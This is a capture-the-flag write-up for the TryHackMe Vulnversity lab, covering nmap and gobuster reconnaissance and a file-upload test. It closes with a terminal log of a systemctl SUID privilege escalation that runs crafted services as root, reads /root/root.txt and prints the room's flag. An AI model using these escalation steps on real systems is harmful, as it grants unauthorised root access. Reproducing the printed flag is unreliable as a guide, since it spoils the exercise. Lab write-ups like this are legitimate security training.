# VulnUniversity
#### Active Recon, Web App Attacks and Privilege Escalation
#### [Room Link](1)

## Tasks 1 & 2
1. Deploy the Machine and connect to our network
 Pretty easy start, make sure your Kali VM is working, initiate VPN connection, deploy the machine, finally ping the [machineIP] to make sure you can reach it.  
2. Enumeration
  Run `nmap -sV -oN nmap_enum.txt 10.10.213.40` and get
  ```
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-18 10:51 EDT
Nmap scan report for 10.10.213.40
Host is up (0.13s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.34 seconds
  ```
  2. How many ports open
    6 ports
  3. What version of the squid proxy is running on the machine?
    `Squid http proxy 3.5.12`
  4. How many ports will nmap scan if the flag -p-400 was used?
    400, the -p- scan 1-65535 by starting with -p-400 it would start with 1 and scan up
    to port 400.
  5. Using the nmap flag -n what will it not resolve?
    Resorting back to the nmap manual (which you can access using `man nmap`) you can
    look down a bit and find that -n means that nmap will not resolve DNS.
  6. What is the most likely operating system this machine is running?
    Based on the nmap scan we preformed it is most likely Ubuntu Linux because of the Apache service info gathered.
    ```
    3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
    Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
    ```
  7. What port is the web server running on?
    Also looking at the above scan portion we see that http (web protocol) is running
    on port 3333. We can verify by visiting that web with our browser as well.
    ![VulnUniversityWebpage](2)
  8. Recon before all else.
   Try always to be running things in the background while you manually explore. If you arent sure what to run research the tools available and see what else could be used.


## Task 3
  1. Install and Setup GoBuster on your machine
    The Go install is one of the harder parts if you dont completely understand what is
    happening. What I do since I setup my VMs so often is this GoLang install script
    [https://github.com/canha/golang-tools-install-script](3)
    After installing that successfully you will be able to just run `go get github.com/OJ/gobuster` and it will install! You can test it by typing `gobuster` and seeing the help
    screen.
  2. What is the directory that has an upload form page?
    We can go ahead and run the gobuster command they gave us with `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.213.40:3333`
    with that running we can get some directories to manually check out while it runs more.
    ```
    ===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.213.40:3333
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/18 11:16:09 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/internal (Status: 301)
    ```
    /images:
    ![imagesdirectory](4)
    /css, /js,/fonts,:
    Just some website files that seem default for now
    /internal:
    ![internaldirectory](5)

    We see that is the directory we are probably looking for.

## Task 4 - Compromise the webserver
  1.  What common extension seems to be blocked?
  We can go back to a common resource in [SecLists](6) to get test files for uploading.
  Going into SecLists/Payloads/PHPInfo we have plenty of file formats. Since we do have the knowledge of an easy compromise lets try a simple .php file(phpinfo.php).
  Unfortunately we get an extension not allowed.
  ![extensionnotallowed](7)

  2.get the webshell and search for suid binarys (thigns that run as root and do things as root when you shouldnt) `www-data@vulnuniversity:/home/bill$ find / -perm -4000 2> /dev/null | xargs ls -lash`

  Look for shell using service we can install using `systemctl`
  Use a resource called [GTFOBins](8) to find something that will help.
  Going down to systemctl section we need to select SUID binary and edit it a little.
  After runnning though it I got
  ```
  ww-data@vulnuniversity:/tmp$ ls -la
  ls -la
  total 40
  drwxrwxrwt  8 root     root     4096 Mar 19 10:40 .
  drwxr-xr-x 23 root     root     4096 Jul 31  2019 ..
  drwxrwxrwt  2 root     root     4096 Mar 19 10:19 .ICE-unix
  drwxrwxrwt  2 root     root     4096 Mar 19 10:19 .Test-unix
  drwxrwxrwt  2 root     root     4096 Mar 19 10:19 .X11-unix
  drwxrwxrwt  2 root     root     4096 Mar 19 10:19 .XIM-unix
  drwxrwxrwt  2 root     root     4096 Mar 19 10:19 .font-unix
  -rw-rw-rw-  1 www-data www-data  100 Mar 19 10:32 Tiger.service
  -rw-r--r--  1 root     root       39 Mar 19 10:36 output
  drwx------  3 root     root     4096 Mar 19 10:19 systemd-private-f39aca9dc1aa4efebcf9be890327b70a-systemd-timesyncd.service-iXKVrf
  www-data@vulnuniversity:/tmp$ rm Tiger.service
  rm Tiger.service
  www-data@vulnuniversity:/tmp$ rm output
  rm output
  rm: remove write-protected regular file 'output'? yes
  yes
  rm: cannot remove 'output': Operation not permitted
  www-data@vulnuniversity:/tmp$ ls
  ls
  output
  systemd-private-f39aca9dc1aa4efebcf9be890327b70a-systemd-timesyncd.service-iXKVrf
  www-data@vulnuniversity:/tmp$ TF=$(mktemp).service
  TF=$(mktemp).service
  www-data@vulnuniversity:/tmp$ echo '[Service]
  echo '[Service]
  > Type=oneshot
  Type=oneshot
  > ExecStart=/bin/sh -c "ls -la > /tmp/output"    
  ExecStart=/bin/sh -c "ls -la > /tmp/output"
  > [Install]
  [Install]
  > WantedBy=multi-user.target' > $TF
  WantedBy=multi-user.target' > $TF
  www-data@vulnuniversity:/tmp$ ./systemctl link $TF
  ./systemctl link $TF
  bash: ./systemctl: No such file or directory
  www-data@vulnuniversity:/tmp$ /bin/systemctl link $TF
  /bin/systemctl link $TF
  Created symlink from /etc/systemd/system/tmp.SbPd4NAR8j.service to /tmp/tmp.SbPd4NAR8j.service.
  www-data@vulnuniversity:/tmp$ /bin/systemctl enable $TF
  /bin/systemctl enable $TF
  Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.SbPd4NAR8j.service to /tmp/tmp.SbPd4NAR8j.service.
  www-data@vulnuniversity:/tmp$ cat /tmp/output
  cat /tmp/output
  uid=0(root) gid=0(root) groups=0(root)
  www-data@vulnuniversity:/tmp$ /bin/systemctl enable --now $TF
  /bin/systemctl enable --now $TF

  www-data@vulnuniversity:/tmp$ cat output
cat output
uid=0(root) gid=0(root) groups=0(root)
www-data@vulnuniversity:/tmp$ ls  
ls
output
systemd-private-f39aca9dc1aa4efebcf9be890327b70a-systemd-timesyncd.service-iXKVrf
tmp.SbPd4NAR8j
tmp.SbPd4NAR8j.service
www-data@vulnuniversity:/tmp$ cat tmp.sbPd4NAR8j.service
cat tmp.sbPd4NAR8j.service
cat: tmp.sbPd4NAR8j.service: No such file or directory
www-data@vulnuniversity:/tmp$ cat tmp.SbPd4NAR8j
cat tmp.SbPd4NAR8j
www-data@vulnuniversity:/tmp$ cat output
cat output
uid=0(root) gid=0(root) groups=0(root)
www-data@vulnuniversity:/tmp$ priv=$(mktemp).service            
priv=$(mktemp).service
www-data@vulnuniversity:/tmp$ echo '[Service]
echo '[Service]
> ExecStart=/bin/bash -c "cat /root/root.txt > /tmp/output"
^[[3~ExecStart=/bin/bash -c "cat /root/root.txt > /tmp/output"
> [Install]
[Install]
> WantedBy=multi-user.target' >$priv            
WantedBy=multi-user.target' >$priv
www-data@vulnuniversity:/tmp$ /bin/systemctl link $priv
/bin/systemctl link $priv
Created symlink from /etc/systemd/system/tmp.FBKnbGuZLP.service to /tmp/tmp.FBKnbGuZLP.service.
www-data@vulnuniversity:/tmp$ /bin/systemctl enable --now $priv
/bin/systemctl enable --now $priv
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.FBKnbGuZLP.service to /tmp/tmp.FBKnbGuZLP.service.
www-data@vulnuniversity:/tmp$ cat ouput
cat ouput
cat: ouput: No such file or directory
www-data@vulnuniversity:/tmp$ cat output
cat output
a58ff8579f0a9270368d33a9966c7fd5
www-data@vulnuniversity:/tmp$
  ```
USing this modified service file with the enviroment varible workaround we are able to cat out the root flag without having a root shell, however we could setup a reverse
shell back out to out listener and gain persistant access via that.


## Review

For links
[1]: https://tryhackme.com/room/vulnversity
[2]:./resources/vulnuni_web3333.png
[3]:https://github.com/canha/golang-tools-install-script
[4]:./resources/vulnuni_images3333.png
[5]:./resources/vulnuni_internal3333.png
[6]: https://github.com/danielmiessler/SecLists
[7]: ./resource/vulnuni_extnotallowed3333.png
[8]: https://gtfobins.github.io/
